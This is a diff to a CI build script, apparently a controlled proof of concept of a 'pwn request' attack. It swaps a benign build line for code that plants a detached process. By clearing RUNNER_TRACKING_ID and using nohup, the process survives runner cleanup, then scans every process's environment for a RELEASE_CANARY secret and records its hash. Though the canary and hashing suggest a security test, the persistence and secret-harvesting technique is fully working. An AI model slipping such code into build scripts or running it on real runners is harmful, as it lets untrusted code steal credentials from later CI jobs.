@@ -1,3 +1,27 @@
 #!/usr/bin/env bash
 set -euo pipefail
-echo "benign controlled build"
+
+rm -f /tmp/pwnreq-survivor.capture /tmp/pwnreq-survivor.finished
+script=/tmp/pwnreq-survivor.sh
+printf '%s\n' \
+  '#!/usr/bin/env bash' \
+  'deadline=$((SECONDS + 600))' \
+  'while (( SECONDS < deadline )); do' \
+  '  for envfile in /proc/[0-9]*/environ; do' \
+  '    value=$(tr "\0" "\n" < "$envfile" 2>/dev/null | sed -n "s/^RELEASE_CANARY=//p" | head -n 1) || true' \
+  '    if [[ -n "$value" ]]; then' \
+  '      digest=$(printf "%s" "$value" | sha256sum | cut -d" " -f1)' \
+  '      printf "sha256:%s\n" "$digest" > /tmp/pwnreq-survivor.capture' \
+  '      : > /tmp/pwnreq-survivor.finished' \
+  '      exit 0' \
+  '    fi' \
+  '  done' \
+  '  sleep 0.1' \
+  'done' > "$script"
+chmod 700 "$script"
+RUNNER_TRACKING_ID='' nohup "$script" \
+  >/tmp/pwnreq-survivor.log 2>&1 </dev/null &
+survivor_pid=$!
+survivor_start=$(awk '{print $22}' "/proc/${survivor_pid}/stat")
+printf '%s:%s\n' "$survivor_pid" "$survivor_start" > /tmp/pwnreq-survivor.meta
+echo "planted-survivor-pid=${survivor_pid}"
